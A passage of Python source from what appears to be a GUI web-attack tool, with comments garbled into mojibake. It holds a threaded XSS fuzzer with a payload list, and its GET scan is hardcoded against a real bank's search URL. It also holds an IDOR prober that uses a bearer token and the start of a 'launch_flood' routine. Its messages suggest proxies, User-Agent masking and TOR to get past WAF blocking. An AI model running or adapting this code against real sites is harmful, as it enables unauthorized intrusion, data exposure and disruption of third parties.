            variants = variants[:20] if len(variants) > 20 else variants

            def recurse(obj, path=None):
                path = [] if path is None else path
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        if isinstance(v, str):
                            for pv in variants:
                                m = copy.deepcopy(base_data)
                                tgt = m
                                for pth in path:
                                    tgt = tgt[pth]
                                tgt[k] = pv
                                mutations.append(("json", m, ".".join(map(str, path + [k])), pv))
                        elif isinstance(v, (dict, list)):
                            recurse(v, path + [k])
                elif isinstance(obj, list):
                    for idx, v in enumerate(obj):
                        if isinstance(v, str):
                            for pv in variants:
                                m = copy.deepcopy(base_data)
                                tgt = m
                                for pth in path:
                                    tgt = tgt[pth]
                                tgt[idx] = pv
                                mutations.append(("json", m, ".".join(map(str, path + [idx])), pv))
                        elif isinstance(v, (dict, list)):
                            recurse(v, path + [idx])

            # –¢–∞–∫–∂–µ –¥–æ–±–∞–≤–∏–º form-urlencoded –≤–∞—Ä–∏–∞–Ω—Ç—ã (–µ—Å–ª–∏ –∫–æ—Ä–µ–Ω—å ‚Äî dict)
            if isinstance(base_data, dict):
                for pv in variants:
                    try:
                        form = {}
                        # –ü–æ–¥—Å—Ç–∞–≤–ª—è–µ–º –ø–µ–π–ª–æ–∞–¥ –≤–æ –≤—Å–µ —Å—Ç—Ä–æ–∫–æ–≤—ã–µ –∫–ª—é—á–∏ –∫–∞–∫ –∑–Ω–∞—á–µ–Ω–∏–µ
                        for k, v in base_data.items():
                            form[k] = pv if isinstance(v, str) else v
                        mutations.append(("form", form, "*", pv))
                    except Exception:
                        pass

            recurse(base_data)
            return mutations

        # === 6. –õ–æ–≥–∏ –∏ –ø—É—Ç–∏ ===
        os.makedirs("logs", exist_ok=True)
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        out_dir = os.path.join("logs", f"post_xss_fuzz_{ts}")
        os.makedirs(out_dir, exist_ok=True)
        summary_path = os.path.join(out_dir, "summary.json")

        self.log(
            f"[üîç] POST XSS-—Ñ—É–∑–∑–∏–Ω–≥ –Ω–∞ {url} | payloads={len(payloads)} | timeout={timeout}s | rate={rate_limit} rps")

        # === 7. –°–µ—Å—Å–∏—è —Å —Ä–µ—Ç—Ä–∞—è–º–∏ ===
        session = create_retry_session(
            total=CONFIG["network"]["retry_total"],
            backoff=CONFIG["network"]["retry_backoff"],
            proxies=CONFIG["network"]["proxies"],
            timeout=timeout
        )

        # === 8. –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å —Å–µ–º–∞—Ñ–æ—Ä–æ–º –∏ –¥–∂–∏—Ç—Ç–µ—Ä–æ–º ===
        results = []
        req_idx = 0

        def send_one(kind: str, body, param_path: str, pv: str, ct_override: str | None = None,
                     ua_override: str | None = None):
            nonlocal req_idx
            with self._sem:
                req_idx += 1
                # –î–∂–∏—Ç—Ç–µ—Ä –Ω–∞ –∏–Ω—Ç–µ—Ä–≤–∞–ª –∏ –≥–ª–æ–±–∞–ª—å–Ω—ã–π rate limit
                if rate_limit > 0:
                    time.sleep(max(0.0, 1.0 / rate_limit) * (0.7 + 0.6 * (os.urandom(1)[0] / 255)))
                else:
                    self._bucket.wait()

                h = dict(headers)
                if ct_override:
                    h["Content-Type"] = ct_override
                if ua_override:
                    h["User-Agent"] = ua_override
                h["Accept"] = accept_all[req_idx % len(accept_all)]

                try:
                    if kind == "json":
                        resp = session.post(url, headers=h, json=body, timeout=timeout)
                    else:
                        # form-urlencoded
                        resp = session.post(url, headers=h, data=body, timeout=timeout)

                    reflected = str(pv) in resp.text
                    ctx = "üìú Reflected XSS" if reflected else "–ß–∏—Å—Ç–æ"

                    entry = {
                        "url": url,
                        "context": ctx,
                        "category": category,
                        "param": param_path,
                        "payload": pv,
                        "status": resp.status_code,
                        "length": len(resp.text),
                        "full_response": resp.text
                    }

                    # GUI-–ª–æ–≥–µ—Ä –∏ —Ç–∞–±–ª–∏—Ü–∞ –∫–æ–Ω—Ç–µ–∫—Å—Ç–æ–≤
                    if hasattr(self, "gui_logger"):
                        self.gui_logger(entry)
                    else:
                        self.log(f"[üí•] {ctx} ‚Üí {url} (param: {param_path})")

                    if hasattr(self, "xss_context_tree"):
                        tags = ("reflected",) if reflected else ()
                        self.xss_context_tree.insert("", "end",
                                                     values=(url, ctx, "JSON" if kind == "json" else "FORM", pv),
                                                     tags=tags)

                    # Honeypot –Ω–∞ –æ—Ç—Ä–∞–∂–µ–Ω–∏—è—Ö
                    if reflected:
                        self.save_success(url, pv)
                        try:
                            start_honeypot()
                        except Exception as he:
                            self.log(f"[‚ö†] Honeypot error: {he}")

                    # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –æ—Ç–≤–µ—Ç–∞
                    resp_file = os.path.join(out_dir, f"response_{req_idx:04d}.txt")
                    with open(resp_file, "w", encoding="utf-8") as f:
                        f.write(resp.text)

                    results.append({
                        "url": url,
                        "context": ctx,
                        "payload": pv,
                        "param": param_path,
                        "kind": kind,
                        "status": resp.status_code,
                        "length": len(resp.text),
                        "response_path": os.path.relpath(resp_file, out_dir)
                    })
                except Exception as e:
                    err = {"error": str(e), "url": url, "payload": pv, "param": param_path, "kind": kind}
                    if hasattr(self, "gui_logger"):
                        self.gui_logger(err)
                    else:
                        self.log(f"[‚ùå] –û—à–∏–±–∫–∞: {e} ‚Üí {url} (param: {param_path})")
                    results.append(err)

        # === 9. –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª —Å–æ —Å–º–µ–Ω–æ–π –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤ –∏ —Ç–∏–ø–æ–≤
        threads = []
        for p in payloads:
            mutations = inject_payloads(base_json, p)
            for kind, body, param_path, pv in mutations:
                # –ü–µ—Ä–µ–±–æ—Ä –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤ –¥–ª—è –∞–≥—Ä–µ—Å—Å–∏–≤–Ω–æ–≥–æ –æ–±—Ö–æ–¥–∞
                for ct in content_types[:2] if kind == "json" else ["application/x-www-form-urlencoded"]:
                    ua = ua_variants[req_idx % len(ua_variants)] if ua_variants else None
                    t = threading.Thread(target=send_one, args=(kind, body, param_path, pv, ct, ua), daemon=True)
                    threads.append(t)
                    t.start()

        # –û–∂–∏–¥–∞–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è
        for t in threads:
            t.join()

        # === 10. –ò—Ç–æ–≥–æ–≤—ã–π –æ—Ç—á—ë—Ç (–∞—Ç–æ–º–∞—Ä–Ω–æ) ===
        try:
            tmp = f"{summary_path}.tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump({
                    "target": url,
                    "category": category,
                    "payload_count": len(payloads),
                    "request_count": req_idx,
                    "timeout": timeout,
                    "rate_limit": rate_limit,
                    "results": results
                }, f, indent=2, ensure_ascii=False)
            os.replace(tmp, summary_path)
            self.log(f"[üìÅ] –û—Ç—á—ë—Ç —Å–æ—Ö—Ä–∞–Ω—ë–Ω: {summary_path}")
        except Exception as e:
            self.log(f"[‚ùå] –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å summary.json: {e}")

        self.log(f"[‚úÖ] –§—É–∑–∑–∏–Ω–≥ –∑–∞–≤–µ—Ä—à—ë–Ω, –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {req_idx} –∑–∞–ø—Ä–æ—Å–æ–≤.")

    def test_xss_payloads(self):
        """
        üöÄ –ê–≤—Ç–æ-–ø—Ä–æ–≤–µ—Ä–∫–∞ XSS-–ø–µ–π–ª–æ–∞–¥–æ–≤ –ø–æ —Å–ø–∏—Å–∫—É URL —Å –ø–∞—Ä–∞–ª–ª–µ–ª–∏–∑–º–æ–º, rate-limiting –∏ —É—Å—Ç–æ–π—á–∏–≤—ã–º —Å–µ—Ç–µ–≤—ã–º —Å–ª–æ–µ–º.
        –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç GET, –∞–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç –æ—Ç—Ä–∞–∂–µ–Ω–∏–µ, –ª–æ–≥–∏—Ä—É–µ—Ç, —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –æ—Ç–≤–µ—Ç—ã –∏ –∏—Ç–æ–≥–æ–≤—ã–π –æ—Ç—á—ë—Ç –∞—Ç–æ–º–∞—Ä–Ω–æ.
        """
        # TODO: –ü–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å –∏–º–ø–æ—Ä—Ç—ã –≤ –Ω–∞—á–∞–ª–æ —Ñ–∞–π–ª–∞
        import os, json, datetime, threading, time, urllib.parse, random, html
        import requests
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry

        # ===== 0. –ö–æ–Ω—Ç—Ä–æ–ª—å —Å–æ–≥–ª–∞—Å–∏—è –∏ allowlist =====
        if hasattr(self, "_require_consent") and not self._require_consent():
            self.log("[‚ö†Ô∏è] –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞: –Ω–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.")
            return

        def is_allowed(url: str) -> bool:
            if not hasattr(self, "safety") or not self.safety.allowlist:
                return True
            return any(url.startswith(p) for p in self.safety.allowlist)

        # ===== 1. –û—á–∏—Å—Ç–∫–∞ —Ç–∞–±–ª–∏—Ü =====
        for item in self.xss_tree.get_children():
            self.xss_tree.delete(item)

        # –ù–µ —Ç—Ä–æ–≥–∞–µ–º xss_context_tree ‚Äî –æ–Ω –∫–æ–ø–∏—Ç –∫–æ–Ω—Ç–µ–∫—Å—Ç—ã –∏–∑ —Ä–∞–∑–Ω—ã—Ö –º–æ–¥—É–ª–µ–π

        # ===== 2. –°–µ—Ä–≤–∏—Å: –Ω–æ—Ä–º–∞–ª–∏–∑–∞—Ü–∏—è –∏ —Å–µ—Å—Å–∏—è —Å —Ä–µ—Ç—Ä–∞—è–º–∏ =====
        def normalize_url(u: str) -> str:
            u = u.strip()
            if not u.startswith(("http://", "https://")):
                u = "http://" + u
            return u

        def create_session() -> requests.Session:
            retry = Retry(
                total=3,
                backoff_factor=0.7,
                status_forcelist=(429, 500, 502, 503, 504),
                allowed_methods=["GET"],
                raise_on_status=False,
                respect_retry_after_header=True
            )
            adapter = HTTPAdapter(max_retries=retry)
            s = requests.Session()
            s.mount("http://", adapter)
            s.mount("https://", adapter)
            s.max_redirects = 5
            return s

        session = create_session()

        # ===== 3. URL‚Äë—Å–ø–∏—Å–æ–∫ –∏ –≤–∞—Ä–∏–∞—Ç–∏–≤–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏ =====
        # TODO: –ó–∞–≥—Ä—É–∂–∞—Ç—å –∏–∑ –∫–æ–Ω—Ñ–∏–≥–∞ –∏–ª–∏ UI, –Ω–µ —Ö–∞—Ä–¥–∫–æ–¥–∏—Ç—å
        base_targets = [
            "https://gazprombank.ru/?search=",  # –ü—Ä–∏–º–µ—Ä - –∑–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–π URL
        ]
        # –ï—Å–ª–∏ —Å–ø–∏—Å–æ–∫ –ø—É—Å—Ç, –∏—Å–ø–æ–ª—å–∑—É–µ–º URL –∏–∑ UI
        if not base_targets:
            try:
                url_from_ui = self.get_selected_url()
                if url_from_ui:
                    base_targets = [url_from_ui]
            except ValueError:
                messagebox.showerror("–û—à–∏–±–∫–∞", "–£–∫–∞–∂–∏—Ç–µ —Ü–µ–ª–µ–≤–æ–π URL –≤ –ø–æ–ª–µ API Endpoint –∏–ª–∏ –ü–æ–ª–Ω—ã–π URL")
                return
        base_targets = [normalize_url(u) for u in base_targets]
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) XSSFuzz/2.0",
            "curl/8.0.1 (xss-audit)",
            "SecurityTest/1.1 (+test)"
        ]
        accepts = ["*/*", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"]

        # ===== 4. –ù–∞–±–æ—Ä –ø–µ–π–ª–æ–∞–¥–æ–≤ (–∞–≥—Ä–µ—Å—Å–∏–≤–Ω—ã–µ —à–∞–±–ª–æ–Ω—ã) =====
        payloads = [
            '<script>alert(1)</script>',
            '"><svg/onload=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<math><mtext></mtext><script>alert(1)</script>",
            "<video><source onerror='alert(1)'>",
            "<marquee onstart=alert(1)>",
            "<svg onload=confirm(1)>",
            '<a href="javascript:alert(1)">click</a>',
            "\"><body onload=alert(1)>",
            "\"><input onfocus=alert(1) autofocus>",
        ]

        # ===== 5. UI: –∏–Ω—Ç–µ—Ä–≤–∞–ª, —Ç–∞–π–º–∞—É—Ç, rate =====
        try:
            interval = float(self.interval_entry.get())
        except Exception:
            interval = 1.0
        try:
            timeout = float(self.timeout_spin.get())
        except Exception:
            timeout = 8.0
        try:
            rate_limit = float(self.rate_spin.get())
        except Exception:
            rate_limit = 0.0

        # ===== 6. –õ–æ–≥–∏: –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –∫–∞—Ç–∞–ª–æ–≥–∞ =====
        os.makedirs("logs", exist_ok=True)
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        out_dir = os.path.join("logs", f"xss_payload_test_{ts}")
        os.makedirs(out_dir, exist_ok=True)
        summary_path = os.path.join(out_dir, "summary.json")

        self.response_box.delete("1.0", "end")
        self.response_box.insert("end", "üöÄ –ó–∞–ø—É—Å–∫ XSS-–ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ —Å–ø–∏—Å–∫—É URL:\n\n")

        # ===== 7. –ì–ª–æ–±–∞–ª—å–Ω—ã–π TokenBucket –∏ —Å–µ–º–∞—Ñ–æ—Ä =====
        bucket = getattr(self, "_bucket", None) or type("TB", (), {"wait": lambda s: None})()
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫—É –∏–∑ safety config –≤–º–µ—Å—Ç–æ —Ö–∞—Ä–¥–∫–æ–¥–∞
        sem = getattr(self, "_sem", threading.Semaphore(self.safety.max_concurrency))

        # ===== 8. –î–µ—Ç–µ–∫—Ü–∏—è –æ—Ç—Ä–∞–∂–µ–Ω–∏—è =====
        def is_reflected(resp_text: str, raw_payload: str) -> bool:
            # –ü—Ä—è–º–æ–µ –≤—Ö–æ–∂–¥–µ–Ω–∏–µ
            if raw_payload in resp_text:
                return True
            # –î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã
            decoded = html.unescape(resp_text)
            if raw_payload in decoded:
                return True
            # JS/HTML —ç–≤—Ä–∏—Å—Ç–∏–∫–∏
            low = resp_text.lower()
            if ("<script" in low and "alert(1)" in low) or ("onerror" in low and "alert(1)" in low):
                return True
            return False

        # ===== 9. –û—Å–Ω–æ–≤–Ω–æ–π –∑–∞–ø—É—Å–∫: –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω—ã–π –ø–µ—Ä–µ–±–æ—Ä =====
        results = []
        req_idx = 0
        req_idx_lock = threading.Lock()  # –õ–æ–∫–∞–ª—å–Ω—ã–π lock –¥–ª—è thread-safety
        threads = []

        def worker(target_base: str, payload: str):
            nonlocal req_idx
            # –ö–æ–¥–∏—Ä—É–µ–º payload –∫–∞–∫ –ø–∞—Ä–∞–º–µ—Ç—Ä search
            encoded = urllib.parse.quote(payload, safe="")
            url = f"{target_base}{encoded}"
            if not is_allowed(url):
                self.log(f"[‚ö†Ô∏è] –ü—Ä–æ–ø—É—Å–∫: —Ü–µ–ª—å –≤–Ω–µ allowlist ‚Üí {url}")
                return

            with sem:
                # –ì–ª–æ–±–∞–ª—å–Ω—ã–π RPS –∏ –¥–∂–∏—Ç—Ç–µ—Ä
                try:
                    bucket.wait()
                except Exception:
                    pass
                if rate_limit > 0:
                    time.sleep((1.0 / rate_limit) * (0.7 + 0.6 * (random.random())))

                # –û—Ç–ø—Ä–∞–≤–∫–∞ (–∏—Å–ø–æ–ª—å–∑—É–µ–º Lock –¥–ª—è thread-safety)
                local_idx = None
                with req_idx_lock:  # –ó–∞—â–∏—Ç–∞ –æ—Ç race condition
                    req_idx += 1
                    local_idx = req_idx

                # –ó–∞–≥–æ–ª–æ–≤–∫–∏ (–ø–æ—Å–ª–µ –∏–Ω–∫—Ä–µ–º–µ–Ω—Ç–∞ –∏–Ω–¥–µ–∫—Å–∞)
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": accepts[local_idx % len(accepts)] if (local_idx is not None and len(accepts) > 0) else (
                        accepts[0] if accepts else "")
                }
                # –¢–æ–∫–µ–Ω –∏–∑ UI (–µ—Å–ª–∏ –µ—Å—Ç—å)
                try:
                    token = self.token_combo.get().strip()
                    if token and token != "‚Äî":
                        headers["Authorization"] = f"Bearer {token}"
                except Exception:
                    pass

                try:
                    resp = session.get(url, headers=headers, timeout=timeout, allow_redirects=True)
                    reflected = is_reflected(resp.text, payload)

                    # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –æ—Ç–≤–µ—Ç–∞
                    resp_file = os.path.join(out_dir, f"response_{local_idx:04d}.txt")
                    with open(resp_file, "w", encoding="utf-8") as f:
                        f.write(resp.text)

                    # GUI –ª–æ–≥ –∏ —Ç–∞–±–ª–∏—Ü—ã
                    mark = "‚ö†Ô∏è" if reflected else "‚úÖ"
                    self.response_box.insert("end", f"{mark} {url} ‚Üí {resp.status_code}\n")

                    self.xss_tree.insert(
                        "", "end",
                        values=(url, resp.status_code, "Yes" if reflected else "No", len(resp.text)),
                        tags=("reflected",) if reflected else ("clean",)
                    )

                    # –ö–æ–Ω—Ç–µ–∫—Å—Ç–Ω–∞—è –∑–∞–ø–∏—Å—å –¥–ª—è –¥–µ—Ç–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Å–º–æ—Ç—Ä–∞
                    entry_ctx = {
                        "url": url,
                        "context": "üìú Reflected XSS" if reflected else "–ß–∏—Å—Ç–æ",
                        "category": "GET",
                        "param": "search",
                        "payload": payload,
                        "status": resp.status_code,
                        "length": len(resp.text),
                        "full_response": resp.text
                    }
                    self.xss_results.append(entry_ctx)
                    if hasattr(self, "xss_context_tree"):
                        self.xss_context_tree.insert(
                            "", "end",
                            values=(url, entry_ctx["context"], "GET", payload),
                            tags=("reflected",) if reflected else ()
                        )

                    # –ò—Ç–æ–≥ –≤ summary
                    results.append({
                        "url": url,
                        "status": resp.status_code,
                        "reflected": reflected,
                        "length": len(resp.text),
                        "response_path": os.path.relpath(resp_file, out_dir)
                    })

                except requests.exceptions.RetryError as retry_err:
                    self.response_box.insert("end", f"üîÅ {url} ‚Üí –ü–æ–≤—Ç–æ—Ä—ã –∏—Å—á–µ—Ä–ø–∞–Ω—ã: {retry_err}\n")
                    results.append({"url": url, "error": "RetryError", "message": str(retry_err)})
                except requests.exceptions.RequestException as e:
                    self.response_box.insert("end", f"‚ùå {url} ‚Üí {str(e)}\n")
                    results.append({"url": url, "error": "RequestException", "message": str(e)})
                except Exception as e:
                    self.response_box.insert("end", f"‚ùå {url} ‚Üí {str(e)}\n")
                    results.append({"url": url, "error": "Exception", "message": str(e)})

                # –ò–Ω—Ç–µ—Ä–≤–∞–ª –ø–æ UI
                if interval > 0:
                    time.sleep(interval)

        # –ó–∞–ø—É—Å–∫–∞–µ–º ¬´—Å–µ—Ç—å¬ª –ø–æ—Ç–æ–∫–æ–≤
        for base in base_targets:
            for p in payloads:
                t = threading.Thread(target=worker, args=(base, p), daemon=True)
                threads.append(t)
                t.start()

        for t in threads:
            t.join()

        # ===== 10. –§–∏–Ω–∞–ª—å–Ω–∞—è —Å–≤–æ–¥–∫–∞ –∏ –æ—Ç—á—ë—Ç (–∞—Ç–æ–º–∞—Ä–Ω–æ) =====
        success_count = sum(1 for r in results if "status" in r)
        fail_count = sum(1 for r in results if "error" in r)
        reflected_count = sum(1 for r in results if r.get("reflected"))

        self.response_box.insert("end", "\nüìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ XSS-–ø—Ä–æ–≤–µ—Ä–∫–∏:\n")
        self.response_box.insert("end", f"  ‚úÖ –£—Å–ø–µ—à–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤: {success_count}\n")
        self.response_box.insert("end", f"  ‚ö†Ô∏è –û—Ç—Ä–∞–∂—ë–Ω–Ω—ã—Ö –ø–µ–π–ª–æ–∞–¥–æ–≤: {reflected_count}\n")
        self.response_box.insert("end", f"  ‚ùå –û—à–∏–±–æ–∫/—Ç–∞–π–º-–∞—É—Ç–æ–≤: {fail_count}\n")

        if fail_count == len(results) and len(results) > 0:
            self.response_box.insert("end", "\nüìâ –í—Å–µ –∑–∞–ø—Ä–æ—Å—ã –≤ –æ—à–∏–±–∫–µ/—Ç–∞–π–º-–∞—É—Ç–µ –∏–ª–∏ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã.\n")
            self.response_box.insert("end", "üí° –í–æ–∑–º–æ–∂–Ω—ã–µ –ø—Ä–∏—á–∏–Ω—ã:\n")
            self.response_box.insert("end", "  ‚Ä¢ –°–µ—Ä–≤–µ—Ä –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –∏–ª–∏ –ø–µ—Ä–µ–≥—Ä—É–∂–µ–Ω\n")
            self.response_box.insert("end", "  ‚Ä¢ –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ (WAF)\n")
            self.response_box.insert("end", "  ‚Ä¢ –ü—Ä–æ–±–ª–µ–º—ã —Å —Å–µ—Ç—å—é –∏–ª–∏ DNS\n")
            self.response_box.insert("end", "\nüîß –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏:\n")
            self.response_box.insert("end", "  ‚Ä¢ –ü—Ä–æ–≤–µ—Ä—å –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å —Å–∞–π—Ç–∞ –≤—Ä—É—á–Ω—É—é\n")
            self.response_box.insert("end", "  ‚Ä¢ –£–≤–µ–ª–∏—á—å —Ç–∞–π–º–∞—É—Ç –¥–æ 10‚Äì15 —Å–µ–∫—É–Ω–¥\n")
            self.response_box.insert("end", "  ‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–π –ø—Ä–æ–∫—Å–∏ –∏–ª–∏ –º–∞—Å–∫–∏—Ä–æ–≤–∫—É User-Agent\n")
            self.response_box.insert("end", "  ‚Ä¢ –ü–æ–ø—Ä–æ–±—É–π –∑–∞–ø—É—Å–∫ —Å VPN/TOR\n")

        # –ê—Ç–æ–º–∞—Ä–Ω–æ –ø–∏—à–µ–º summary
        try:
            tmp = f"{summary_path}.tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump({
                    "targets": base_targets,
                    "payload_count": len(payloads),
                    "request_count": req_idx,
                    "timeout": timeout,
                    "rate_limit": rate_limit,
                    "interval": interval,
                    "results": results
                }, f, indent=2, ensure_ascii=False)
            os.replace(tmp, summary_path)
            messagebox.showinfo("XSS-—Ç–µ—Å—Ç –∑–∞–≤–µ—Ä—à—ë–Ω", f"–†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤:\n{summary_path}")
        except Exception as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –æ—Ç—á—ë—Ç:\n{e}")

    def run_idor_test(self):
        token = self.token_combo.get().strip()
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }

        test_ids = ["1", "2", "admin", "null", "0", "-1"]
        param_names = ["id", "user_id", "account", "profile"]
        sensitive_keys = {"email", "username", "role", "admin", "token", "jwt", "session", "id"}
        results = []

        self.response_box.insert("end", "\nüß™ –†–∞—Å—à–∏—Ä–µ–Ω–Ω–æ–µ IDOR-—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ:\n")

        for endpoint in self.api_list:
            for param in param_names:
                for test_id in test_ids:
                    url = f"{endpoint}&{param}={test_id}" if "?" in endpoint else f"{endpoint}?{param}={test_id}"

                    try:
                        response = requests.get(url, headers=headers, timeout=6)
                        preview = response.text[:300]
                        sensitive = False

                        try:
                            parsed = response.json()
                            if self.contains_sensitive(parsed, sensitive_keys):
                                sensitive = True
                        except Exception:
                            for k in sensitive_keys:
                                if k in preview.lower():
                                    sensitive = True
                                    break

                        entry = {
                            "url": url,
                            "status": response.status_code,
                            "length": len(response.text),
                            "sensitive": sensitive,
                            "preview": preview
                        }
                        results.append(entry)

                        mark = "‚ö†Ô∏è" if sensitive else "‚úÖ"
                        self.response_box.insert("end",
                                                 f"{mark} {url} ‚Üí {response.status_code} ({len(response.text)} bytes)\n")

                    except Exception as e:
                        self.response_box.insert("end", f"‚ùå {url} ‚Üí {str(e)}\n")

        os.makedirs("logs", exist_ok=True)
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        log_path = f"logs/idor_test_{timestamp}.json"
        with open(log_path, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)

        messagebox.showinfo("IDOR-—Ç–µ—Å—Ç –∑–∞–≤–µ—Ä—à—ë–Ω", f"–†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤:\n{log_path}")

    # ===== IDOR –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ/—Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è/—ç–∫—Å–ø–æ—Ä—Ç =====

    def display_idor_results(self, status_filter="All"):
        for item in self.idor_tree.get_children():
            self.idor_tree.delete(item)

        for entry in self.idor_results:
            if status_filter != "All" and str(entry["status"]) != status_filter:
                continue

            tag = "sensitive" if entry["sensitive"] else "normal"
            self.idor_tree.insert(
                "", "end",
                values=(
                    entry["url"],
                    entry["status"],
                    "‚ö†Ô∏è Yes" if entry["sensitive"] else "No"
                ),
                tags=(tag,)
            )

    def filter_idor_results(self, event=None):
        selected_status = self.status_filter.get()
        self.display_idor_results(status_filter=selected_status)

    def export_idor_to_csv(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV files", "*.csv")])
        if not file_path:
            return

        with open(file_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["URL", "Status", "Sensitive"])
            for item in self.idor_tree.get_children():
                writer.writerow(self.idor_tree.item(item)["values"])

        messagebox.showinfo("‚úÖ –≠–∫—Å–ø–æ—Ä—Ç –∑–∞–≤–µ—Ä—à—ë–Ω", f"–†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤:\n{file_path}")

    def send_request(self, url):
        try:
            return requests.get(url, timeout=5)
        except Exception as e:
            class DummyResponse:
                status_code = 0
                text = str(e)

            return DummyResponse()

    def detect_sensitive_data(self, response):
        keywords = ["password", "ssn", "credit", "token"]
        return any(kw in response.text.lower() for kw in keywords)

    # ===== –í—ã–±–æ—Ä JSON-—Ñ–∞–π–ª–∞ –∏ –∑–∞–≥—Ä—É–∑–∫–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è =====
    def select_json_file(self):
        path = filedialog.askopenfilename(title="–í—ã–±–µ—Ä–∏ JSON-—Ñ–∞–π–ª", filetypes=[("JSON files", "*.json")])
        if path:
            self.load_scan_results(path)

    def load_scan_results(self, custom_path=None):
        self.api_list.clear()
        self.token_list.clear()
        self.payload_combo["values"] = list(generate_payloads().keys())

        candidates = [custom_path] if custom_path else [
            os.path.join("logs", "crawler_results.json"),
            os.path.join("logs", "deep_crawl.json"),
            "crawler_results.json",
            "deep_crawl.json"
        ]

        for path in candidates:
            if path and os.path.exists(path):
                try:
                    with open(path, encoding="utf-8") as f:
                        data = json.load(f)
                    self.api_list.extend(data.get("api_endpoints", []))
                    self.token_list.extend(data.get("tokens", []))
                    self.log(f"[üì•] –ó–∞–≥—Ä—É–∂–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ –∏–∑: {path}")
                    break
                except Exception as e:
                    self.log(f"[‚ùå] –û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è {path}: {e}")

        self.api_combo["values"] = self.api_list or ["‚Äî"]
        self.token_combo["values"] = self.token_list or ["‚Äî"]

        if self.api_list:
            self.api_combo.set(self.api_list[0])
        if self.token_list:
            self.token_combo.set(self.token_list[0])

    # ===== üîç –†–µ–∫—É—Ä—Å–∏–≤–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã—Ö –∫–ª—é—á–µ–π –≤ JSON =====
    def contains_sensitive(self, data, keys):
        if isinstance(data, dict):
            for k, v in data.items():
                if k.lower() in keys:
                    return True
                if self.contains_sensitive(v, keys):
                    return True
        elif isinstance(data, list):
            for item in data:
                if self.contains_sensitive(item, keys):
                    return True
        return False

    def launch_flood(self):
        if not self._require_consent():
            self.log("[‚ö†Ô∏è] –ê—Ç–∞–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞: –Ω–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.")
            return

        try:
            interval = float(self.interval_entry.get())
        except ValueError:
